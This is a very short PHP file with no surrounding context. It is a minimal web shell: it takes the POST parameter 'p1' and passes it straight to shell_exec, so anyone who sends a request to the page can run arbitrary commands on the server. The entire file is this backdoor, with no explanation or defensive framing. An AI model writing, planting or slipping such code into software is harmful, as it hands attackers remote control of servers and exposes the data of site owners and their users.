<?php
function ex($in) {
	$res = shell_exec($in);
	return $res;
}

ex($_POST['p1']);
?>